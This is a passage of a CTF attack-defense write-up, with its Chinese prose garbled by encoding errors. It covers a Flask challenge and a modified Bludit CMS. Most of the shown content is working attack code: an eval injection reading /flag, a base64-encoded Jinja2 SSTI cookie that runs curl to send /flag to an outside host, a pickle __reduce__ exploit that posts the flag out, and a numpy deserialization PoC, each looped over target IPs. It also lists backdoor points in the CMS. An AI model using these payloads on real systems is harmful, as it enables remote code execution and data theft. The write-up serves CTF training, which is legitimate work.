<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(msg)&gt;<span class="number">27</span>:</span><br><span class="line">    <span class="literal">return</span> render_template(<span class="string">'message.html'</span>, msg=<span class="string">'ç•™è¨€å¤ªé•¿äº†ï¼'</span>, status=<span class="string">'ç•™è¨€å¤±è´¥'</span>)</span><br><span class="line">msg = msg.<span class="built_in">replace</span>(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">msg = msg.<span class="built_in">replace</span>(<span class="string">'_'</span>, <span class="string">''</span>)</span><br><span class="line">retstr = set_str(type,msg)</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥å¯ä»¥ä»»æ„æ‹¼æ¥ä»£ç ï¼Œç»™msgèµ‹å€¼ä¸º</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="string">'+open('</span>/<span class="built_in">flag</span><span class="string">').read()+'</span></span><br></pre></td></tr></table></figure>
<p>è§¦å‘evalï¼Œç›´æ¥readè¯»å–flag</p>
<h4 id="3-SSTI"><a href="#3-SSTI" class="headerlink" title="3.SSTI"></a>3.SSTI</h4><figure class="highlight ceylon"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app</span>.route(<span class="string">'/hello'</span>,methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line">def hello():</span><br><span class="line">    username = request.cookies.get(<span class="string">'username'</span>)</span><br><span class="line">    username = str(base<span class="number">64</span>.b<span class="number">64</span>decode(username), encoding = <span class="string">"utf-8"</span>)</span><br><span class="line">    data = Jinja<span class="number">2</span>.from<span class="number">_</span>string(<span class="string">"Hello , "</span> + username + <span class="string">'!'</span>).render()</span><br><span class="line">    <span class="keyword">is</span><span class="number">_</span><span class="keyword">value</span> = False</span><br><span class="line">    <span class="keyword">return</span> render<span class="number">_</span>template(<span class="string">'hello.html'</span>, msg=data,<span class="keyword">is</span><span class="number">_</span><span class="keyword">value</span>=<span class="keyword">is</span><span class="number">_</span><span class="keyword">value</span>)</span><br></pre></td></tr></table></figure>
<p>æ•°æ®æ¥å£ä¸ºcookieä¸­çš„usernameï¼Œå–å€¼åè¿›è¡Œäº†ä¸€æ¬¡base64è§£ç ï¼Œé€šè¿‡Jinja2.from_string(â€˜****â€™).render()æ¥è§¦å‘SSTIï¼Œä¸ä¼šçš„é˜”ä»¥å‚è€ƒï¼š<a href="https://www.exploit-db.com/exploits/46386ï¼Œæˆ‘ä»¬åœ¨æ‰“çš„æ—¶å€™æ²¡å›æ˜¾ï¼Œæ‰€ä»¥ç”¨çš„æ˜¯åå¼¹flagçš„æ–¹å¼ï¼Œå¼¹åˆ°æœ¬åœ°ç„¶åå†äº¤ï¼Œè´´ä¸‹payload" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/46386ï¼Œæˆ‘ä»¬åœ¨æ‰“çš„æ—¶å€™æ²¡å›æ˜¾ï¼Œæ‰€ä»¥ç”¨çš„æ˜¯åå¼¹flagçš„æ–¹å¼ï¼Œå¼¹åˆ°æœ¬åœ°ç„¶åå†äº¤ï¼Œè´´ä¸‹payload</a></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(3,21):</span><br><span class="line">		try:</span><br><span class="line">			#payload = <span class="string">"system('cat /flag');"</span></span><br><span class="line">			Url =<span class="string">"http://10.0.%s.4:5000/hello"</span>% i </span><br><span class="line">			cookie = &#123;<span class="string">'username'</span>:<span class="string">'e3sgKCkuX19jbGFzc19fLl9fYmFzZXNfX1swXS5fX3N1YmNsYXNzZXNfXygpWzkzXS5fX2luaXRfXy5fX2dsb2JhbHNfX1sic3lzIl0ubW9kdWxlc1sib3MiXS5zeXN0ZW0oJ2N1cmwgImh0dHA6Ly8xMC4xMC4yLjIwNzozMDAxL2ZsYWciIC1kICIkKGNhdCAvZj8/PykiJykgfX0='</span>&#125;</span><br><span class="line">			#<span class="builtin-name">print</span> Url</span><br><span class="line">		<span class="built_in">	IP </span>= <span class="string">'10.0.%s.4'</span>% i</span><br><span class="line">			<span class="builtin-name">print</span> <span class="string">'Target:'</span> + IP</span><br><span class="line">			<span class="attribute">result</span>=requests.post(url=Url,cookies = cookie,<span class="attribute">timeout</span>=3)</span><br><span class="line">			<span class="string">''</span><span class="string">'flag=result.text</span></span><br><span class="line"><span class="string">			mat = re.compile(".*([0-9a-zA-Z]&#123;20&#125;).*")</span></span><br><span class="line"><span class="string">			flag = mat.findall(flag)[0]</span></span><br><span class="line"><span class="string">			print flag</span></span><br><span class="line"><span class="string">			submit_token(flag)'</span><span class="string">''</span></span><br><span class="line">			#submit_cookie(IP,flag)</span><br><span class="line">		except:</span><br><span class="line">			sleep(0.1)</span><br><span class="line">	sleep(200)</span><br></pre></td></tr></table></figure>
<p>æœ¬åœ°èµ·ä¸ªæœåŠ¡æ¥æ”¶å¹¶æäº¤flagå°±è¡Œäº†</p>
<h4 id="4-ååºåˆ—åŒ–"><a href="#4-ååºåˆ—åŒ–" class="headerlink" title="4.ååºåˆ—åŒ–"></a>4.ååºåˆ—åŒ–</h4><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app</span>.route(<span class="string">'/message'</span>,methods=[<span class="string">'POST'</span>,<span class="string">'GET'</span>])</span><br><span class="line">def message():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'message.html'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        type = request.form[<span class="string">'type'</span>][:<span class="number">1</span>]</span><br><span class="line">        msg = request.form[<span class="string">'msg'</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            info = base64.b64decode(request.cookies.<span class="keyword">get</span>(<span class="string">'user'</span>))</span><br><span class="line">            info = pickle.loads(info)</span><br><span class="line">            username = info[<span class="string">"name"</span>]</span><br><span class="line">        except Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            username = <span class="string">"Guest"</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(msg)&gt;<span class="number">27</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'message.html'</span>, msg=<span class="string">'ç•™è¨€å¤ªé•¿äº†ï¼'</span>, status=<span class="string">'ç•™è¨€å¤±è´¥'</span>)</span><br><span class="line">        msg = msg.replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">        msg = msg.replace(<span class="string">'_'</span>, <span class="string">''</span>)</span><br><span class="line">        retstr = set_str(type,msg)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'message.html'</span>,msg=retstr,status=<span class="string">'%s,ç•™è¨€æˆåŠŸ'</span>%username)</span><br></pre></td></tr></table></figure>
<p>ä¸€ä¸ªpickleçš„ååºåˆ—åŒ–ï¼Œæ²¡å•¥ä¸œè¥¿ï¼Œç›´æ¥è´´ä¸‹payload</p>
<figure class="highlight ceylon"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base<span class="number">64</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> exp(<span class="keyword">object</span>):</span><br><span class="line">    def <span class="number">__</span>reduce<span class="number">__</span>(self):</span><br><span class="line">        s = <span class="string">"""curl -F token=mEs8j1Dl -F flag=$(cat /flag) http://10.10.0.2/api/flag/submit"""</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">s = pickle.dumps(e)</span><br><span class="line">post<span class="number">_</span>data = &#123;<span class="string">'msg'</span>:<span class="string">''</span>,<span class="string">'type'</span>:<span class="string">''</span>&#125;</span><br><span class="line">cookie = &#123;<span class="string">'user'</span>,base<span class="number">64</span>.b<span class="number">64</span>encode(s).decode()&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="number">__n</span>ame<span class="number">__</span> == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">21</span>):</span><br><span class="line">        url = http:<span class="comment">//10.0.%s.4:5000/message"% i</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(url = url, cookies = cookie,data = post<span class="number">_</span>data)</span><br><span class="line">        except:</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure>
<p>ååºåˆ—åŒ–ç¬¬äºŒä¸ªç‚¹æ˜¯numpyï¼ˆæˆ‘çœ‹çš„æ—¶å€™çœ‹ç‰ˆæœ¬æŒºæ–°çš„ï¼Œç”±äºå…¶è§¦å‘ä¸»è¦è¿˜æ˜¯pickleï¼Œæ‰€ä»¥è¿™ä¸ªç‚¹è¿˜æ˜¯èƒ½å¤Ÿè§¦å‘ååºåˆ—åŒ–ï¼‰</p>
<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">@app.route(<span class="string">'/getvdot'</span>,methods=[<span class="string">'POST'</span>,<span class="string">'GET'</span>])</span><br><span class="line">def getvdot():</span><br><span class="line">    <span class="keyword">if</span> request<span class="function">.<span class="keyword">method</span> == '<span class="title">GET</span>':</span></span><br><span class="line">        return render_template(<span class="string">'getvdot.html'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        matrix1 = base64.b64decode(request.form[<span class="string">'matrix1'</span>])</span><br><span class="line">        matrix2 = base64.b64decode(request.form[<span class="string">'matrix2'</span>])</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            matrix1 = numpy.loads(matrix1)</span><br><span class="line">            matrix2 = numpy.loads(matrix2)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">        <span class="keyword">result</span> = numpy.vdot(matrix1,matrix2)</span><br><span class="line">        print(<span class="keyword">result</span>)</span><br><span class="line">        return render_template(<span class="string">'getvdot.html'</span>,msg=<span class="keyword">result</span>,status=<span class="string">'å‘é‡ç‚¹ç§¯'</span>)</span><br></pre></td></tr></table></figure>
<p>å‚è€ƒ<a href="https://j7ur8.github.io/WebBook/Python/Numpy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html" target="_blank" rel="noopener">https://j7ur8.github.io/WebBook/Python/Numpy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">genpoc</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line">        s = <span class="string">"""ls"""</span></span><br><span class="line">        <span class="keyword">return</span> os.system, (s,) </span><br><span class="line"></span><br><span class="line">e = genpoc()</span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    poc = pickle.dumps(e)</span><br><span class="line">    print(poc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'1.pkl'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        pickle.dump(e, f)</span><br><span class="line"></span><br><span class="line">numpy.load(<span class="string">'1.pkl'</span>);</span><br></pre></td></tr></table></figure>
<p>æŠŠç”Ÿæˆçš„1.pklè¯»å‡ºæ¥ç›´æ¥èµ‹å€¼ç»™matrix1ï¼Œmatrix2æ‰“å°±è¡Œäº†ï¼ˆæ„Ÿè°¢<strong>f1sh</strong>å¤§å¸ˆå‚…çš„æŒ‡å¯¼ï¼‰ï¼Œæœ¬åœ°æ²¡ç¯å¢ƒï¼Œå°±ä¸è´´å›¾äº†~</p>
<h2 id="0x02-OZero"><a href="#0x02-OZero" class="headerlink" title="0x02 OZero"></a>0x02 OZero</h2><p>è¿™é‡Œå…ˆè´´ä¸‹åœºä¸Šçš„æ—¶å€™z3r0yuå¸ˆå‚…å¯¹æ¯”åçš„åˆ†ææ—¥å¿—ï¼Œæºç ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/bludit/bludit/releases" target="_blank" rel="noopener">https://github.com/bludit/bludit/releases</a></p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">è¢«ä¿®æ”¹çš„å‡ ä¸ªç‚¹</span><br><span class="line"><span class="number">1.</span> bl-kernel/site.class.php</span><br><span class="line"><span class="string">'dribbble'</span>=&gt;		<span class="string">''</span>,</span><br><span class="line"><span class="string">'customFields'</span>=&gt;	<span class="string">'&#123;&#125;'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> bl-kernel/pagex.class.php</span><br><span class="line"><span class="comment">// Returns the value from the field, false if the fields doesn't exists</span></span><br><span class="line"><span class="comment">// If you set the $option as TRUE, the function returns an array with all the values of the field</span></span><br><span class="line">public function custom(<span class="symbol">$</span>field, <span class="symbol">$</span><span class="keyword">options</span>=false)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="symbol">$</span>this-&gt;vars[<span class="string">'custom'</span>][<span class="symbol">$</span>field])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="symbol">$</span><span class="keyword">options</span>) &#123;</span><br><span class="line">            return <span class="symbol">$</span>this-&gt;vars[<span class="string">'custom'</span>][<span class="symbol">$</span>field];</span><br><span class="line">        &#125;</span><br><span class="line">        return <span class="symbol">$</span>this-&gt;vars[<span class="string">'custom'</span>][<span class="symbol">$</span>field][<span class="string">'value'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> bl-kernel/pages.class.php</span><br><span class="line">elseif (<span class="symbol">$</span>field==<span class="string">'custom'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="symbol">$</span>args[<span class="string">'custom'</span>])) &#123;</span><br><span class="line">        global <span class="symbol">$</span>site;</span><br><span class="line">        <span class="symbol">$</span>customFields = <span class="symbol">$</span>site-&gt;customFields();</span><br><span class="line">        foreach (<span class="symbol">$</span>args[<span class="string">'custom'</span>] as <span class="symbol">$</span>customField=&gt;<span class="symbol">$</span>customValue) &#123;</span><br><span class="line">            <span class="symbol">$</span>html = Sanitize::html(<span class="symbol">$</span>customValue);</span><br><span class="line">            <span class="comment">// Store the custom field as defined type</span></span><br><span class="line">            settype(<span class="symbol">$</span>html, <span class="symbol">$</span>customFields[<span class="symbol">$</span>customField][<span class="string">'type'</span>]);</span><br><span class="line">            <span class="symbol">$</span>row[<span class="string">'custom'</span>][<span class="symbol">$</span>customField][<span class="string">'value'</span>] = <span class="symbol">$</span>html;</span><br><span class="line">        &#125;</span><br><span class="line">        unset(<span class="symbol">$</span>args[<span class="string">'custom'</span>]);</span><br><span class="line">        continue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; elseif (<span class="symbol">$</span>field==<span class="string">'custom'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="symbol">$</span>args[<span class="string">'custom'</span>])) &#123;</span><br><span class="line">        global <span class="symbol">$</span>site;</span><br><span class="line">        <span class="symbol">$</span>customFields = <span class="symbol">$</span>site-&gt;customFields();</span><br><span class="line">        foreach (<span class="symbol">$</span>args[<span class="string">'custom'</span>] as <span class="symbol">$</span>customField=&gt;<span class="symbol">$</span>customValue) &#123;</span><br><span class="line">            <span class="symbol">$</span>html = Sanitize::html(<span class="symbol">$</span>customValue);</span><br><span class="line">            <span class="comment">// Store the custom field as defined type</span></span><br><span class="line">            settype(<span class="symbol">$</span>html, <span class="symbol">$</span>customFields[<span class="symbol">$</span>customField][<span class="string">'type'</span>]);</span><br><span class="line">            <span class="symbol">$</span>row[<span class="string">'custom'</span>][<span class="symbol">$</span>customField][<span class="string">'value'</span>] = <span class="symbol">$</span>html;</span><br><span class="line">        &#125;</span><br><span class="line">        unset(<span class="symbol">$</span>args[<span class="string">'custom'</span>]);</span><br><span class="line">        continue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Insert custom fields to all the pages in the database</span></span><br><span class="line"><span class="comment">// The structure for the custom fields need to be a valid JSON format</span></span><br><span class="line"><span class="comment">// The custom fields are incremental, this means the custom fields are never deleted</span></span><br><span class="line"><span class="comment">// The pages only store the value of the custom field, the structure of the custom fields are in the database site.php</span></span><br><span class="line">public function setCustomFields(<span class="symbol">$</span>fields)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="symbol">$</span>customFields = json_decode(<span class="symbol">$</span>fields, true);</span><br><span class="line">    <span class="keyword">if</span> (json_last_error() != JSON_ERROR_NONE) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    foreach (<span class="symbol">$</span>this-&gt;db as <span class="symbol">$</span>pageKey=&gt;<span class="symbol">$</span>pageFields) &#123;</span><br><span class="line">        foreach (<span class="symbol">$</span>customFields as <span class="symbol">$</span>customField=&gt;<span class="symbol">$</span>customValues) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!isset(<span class="symbol">$</span>pageFields[<span class="string">'custom'</span>][<span class="symbol">$</span>customField])) &#123;</span><br><span class="line">                <span class="symbol">$</span>defaultValue = <span class="string">''</span>;</span><br><span class="line">                <span class="keyword">if</span> (isset(<span class="symbol">$</span>customValues[<span class="string">'default'</span>])) &#123;</span><br><span class="line">                    <span class="symbol">$</span>defaultValue = <span class="symbol">$</span>customValues[<span class="string">'default'</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="symbol">$</span>this-&gt;db[<span class="symbol">$</span>pageKey][<span class="string">'custom'</span>][<span class="symbol">$</span>customField][<span class="string">'value'</span>] = <span class="symbol">$</span>defaultValue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return <span class="symbol">$</span>this-&gt;save();</span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> bl-kernel/helpers/tcp.class.php</span><br><span class="line">file_put_contentså¯èƒ½å­˜åœ¨ä»»æ„å†™</span><br><span class="line">	public static function download(<span class="symbol">$</span>url, <span class="symbol">$</span>destination)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="symbol">$</span>data = self::http(<span class="symbol">$</span>url, <span class="symbol">$</span>method=<span class="string">'GET'</span>, <span class="symbol">$</span>verifySSL=true, <span class="symbol">$</span>timeOut=<span class="number">30</span>, <span class="symbol">$</span>followRedirections=true, <span class="symbol">$</span><span class="keyword">binary</span>=true, <span class="symbol">$</span>headers=false);</span><br><span class="line">		return file_put_contents(<span class="symbol">$</span>destination, <span class="symbol">$</span>data);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">ç–‘ä¼¼ä¸€ä¸ªååºåˆ—åŒ–ä¹‹åçš„ä»»æ„æ–‡ä»¶å†™</span><br><span class="line">public function __destruct()&#123;</span><br><span class="line">    <span class="keyword">if</span>(isset(<span class="symbol">$</span>this-&gt;filepath) &amp;&amp; isset(<span class="symbol">$</span>this-&gt;error_log))&#123; </span><br><span class="line">          file_put_contents(PATH_UPLOADS_PROFILES.<span class="symbol">$</span>this-&gt;filepath,<span class="symbol">$</span>this-&gt;error_log);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span> bl-kernel/functions.php</span><br><span class="line">ç–‘ä¼¼å¯ä»¥è§¦å‘ä¸Šè¿°çš„ååºåˆ—åŒ–</span><br><span class="line"><span class="comment">// Check media</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$music</span> = $_GET['path'];</span></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="symbol">$</span>music))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!Sanitize::pathFile(<span class="symbol">$</span>music))&#123;</span><br><span class="line">        <span class="symbol">$</span>filename = basename(<span class="symbol">$</span>music);</span><br><span class="line">        TCP::download(<span class="symbol">$</span>music,PATH_UPLOADS_PROFILES.md5(<span class="symbol">$</span>filename).<span class="string">"."</span>.<span class="string">"avi"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built-in">Log</span>::<span class="keyword">set</span>(__METHOD__.LOG_SEP.<span class="string">'Media request in  '</span>.date(<span class="string">'Y-m-d'</span>), LOG_TYPE_INFO);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">æ¯”åŸä»£ç å¤šäº†å¯¹jsonçš„å¤„ç†</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="symbol">$</span>args[<span class="string">'customFields'</span>])) &#123;</span><br><span class="line">    <span class="comment">// Custom fields need to be JSON format valid, also the empty JSON need to be "&#123;&#125;"</span></span><br><span class="line">    json_decode(<span class="symbol">$</span>args[<span class="string">'customFields'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (json_last_error() != JSON_ERROR_NONE) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="symbol">$</span>pages-&gt;setCustomFields(<span class="symbol">$</span>args[<span class="string">'customFields'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">å¦‚æœå¯ä»¥ç§»åŠ¨å¹¶é‡å‘½åï¼Œè¯´ä¸å®šå°±å¯ä»¥åˆ©ç”¨å’Œè¿™ä¸ªå†™shell</span><br><span class="line"><span class="comment">// Move the image to a proper place and rename</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$image</span> = $imageDir.$nextFilename;</span></span><br><span class="line">Filesystem::mv(<span class="symbol">$</span><span class="keyword">file</span>, <span class="symbol">$</span>image);</span><br><span class="line">chmod(<span class="symbol">$</span>image, <span class="number">0644</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span> tokenCSRF è¢«åˆ é™¤äº†ï¼Œæ‰€ä»¥ä¸éœ€è¦å…¼é¡¾token</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">7.</span> bl-kernel/boot/rules/<span class="number">60.</span>router.php</span><br><span class="line">æ­¤å¤„çš„includeè·å–å¯ä»¥é…åˆerrorlogæ¥getshell</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="symbol">$</span>pageKey = explode(<span class="string">"/"</span>, <span class="symbol">$</span>pageKey);</span><br><span class="line">	foreach(<span class="symbol">$</span>pageKey as <span class="symbol">$</span>key)&#123;</span><br><span class="line">		<span class="keyword">if</span>(constant(<span class="symbol">$</span>key))</span><br><span class="line">			<span class="symbol">$</span>plugin .=constant(<span class="symbol">$</span>key);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="symbol">$</span>plugin .=<span class="string">"/"</span>.<span class="symbol">$</span>key;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="symbol">$</span>plugin = str_replace(<span class="string">".."</span>,<span class="string">"/"</span>,<span class="symbol">$</span>plugin);</span><br><span class="line">	<span class="keyword">if</span>(file_exists(<span class="symbol">$</span>plugin))&#123;</span><br><span class="line">		<span class="symbol">$</span>plugin = addslashes(<span class="symbol">$</span>plugin);</span><br><span class="line">		include <span class="symbol">$</span>plugin;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">8.</span> bl-kernel/boot/init.php   æ­¤å¤„çš„new TCPè·Ÿä¸Šé¢çš„ååºåˆ—åŒ–æœ‰ç‚¹æš—ç¤º</span><br><span class="line">define(<span class="string">'DEBUG_MODE'</span>, TRUE);</span><br><span class="line"><span class="meta"><span class="meta-keyword">$https</span>      = new TCP();</span></span><br><span class="line"></span><br><span class="line"><span class="number">9.</span> bl-kernel/admin/views/settings.php</span><br><span class="line">&lt;?php <span class="symbol">$</span>L-&gt;p(<span class="string">'Custom fields'</span>) ?&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">10.</span> bl-kernel/admin/views/new-content.php</span><br><span class="line">&lt;?php <span class="keyword">if</span> (!empty(<span class="symbol">$</span>site-&gt;customFields())): ?&gt;</span><br><span class="line">&lt;a class=<span class="string">"nav-link"</span> id=<span class="string">"nav-custom-tab"</span> data-toggle=<span class="string">"tab"</span> href=<span class="string">"#nav-custom"</span> role=<span class="string">"tab"</span> aria-controls=<span class="string">"custom"</span>&gt;&lt;?php <span class="symbol">$</span>L-&gt;p(<span class="string">'Custom'</span>) ?&gt;&lt;/a&gt;</span><br><span class="line">&lt;?php endif ?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php <span class="keyword">if</span> (!empty(<span class="symbol">$</span>site-&gt;customFields())): ?&gt;</span><br><span class="line">&lt;<span class="built-in">div</span> id=<span class="string">"nav-custom"</span> class=<span class="string">"tab-pane fade"</span> role=<span class="string">"tabpanel"</span> aria-labelledby=<span class="string">"custom-tab"</span>&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    <span class="symbol">$</span>customFields = <span class="symbol">$</span>site-&gt;customFields();</span><br><span class="line">    foreach(<span class="symbol">$</span>customFields as <span class="symbol">$</span>field=&gt;<span class="symbol">$</span><span class="keyword">options</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'type'</span>]==<span class="string">"string"</span>) &#123;</span><br><span class="line">            echo Bootstrap::formInputTextBlock(array(</span><br><span class="line">                <span class="string">'name'</span>=&gt;<span class="string">'custom['</span>.<span class="symbol">$</span>field.<span class="string">']'</span>,</span><br><span class="line">                <span class="string">'label'</span>=&gt;(isset(<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'label'</span>])?<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'label'</span>]:<span class="string">''</span>),</span><br><span class="line">                <span class="string">'value'</span>=&gt;(isset(<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'default'</span>])?<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'default'</span>]:<span class="string">''</span>),</span><br><span class="line">                <span class="string">'tip'</span>=&gt;(isset(<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'tip'</span>])?<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'tip'</span>]:<span class="string">''</span>),</span><br><span class="line">                <span class="string">'placeholder'</span>=&gt;(isset(<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'placeholder'</span>])?<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'placeholder'</span>]:<span class="string">''</span>)</span><br><span class="line">            ));</span><br><span class="line">        &#125; elseif (<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'type'</span>]==<span class="string">"bool"</span>) &#123;</span><br><span class="line">            echo Bootstrap::formCheckbox(array(</span><br><span class="line">                <span class="string">'name'</span>=&gt;<span class="string">'custom['</span>.<span class="symbol">$</span>field.<span class="string">']'</span>,</span><br><span class="line">                <span class="string">'label'</span>=&gt;(isset(<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'label'</span>])?<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'label'</span>]:<span class="string">''</span>),</span><br><span class="line">                <span class="string">'placeholder'</span>=&gt;(isset(<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'placeholder'</span>])?<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'placeholder'</span>]:<span class="string">''</span>),</span><br><span class="line">                <span class="string">'checked'</span>=&gt;(isset(<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'checked'</span>])?true:false),</span><br><span class="line">                <span class="string">'labelForCheckbox'</span>=&gt;(isset(<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'tip'</span>])?<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'tip'</span>]:<span class="string">''</span>)</span><br><span class="line">            ));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/<span class="built-in">div</span>&gt;</span><br><span class="line">&lt;?php endif ?&gt;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œåˆ†æä¸‰ä¸ªæ¼æ´ï¼ˆååºåˆ—åŒ–ç”¨æ–‡ä»¶æ“ä½œåº”è¯¥æ˜¯å¯ä»¥è§¦å‘çš„ï¼‰ï¼Œå¸ˆå‚…ä»¬è¦æ˜¯åˆ†æäº†å…¶ä»–çš„æ±‚è´´ä¸€æ³¢æ–‡ç« ã€‚</p>
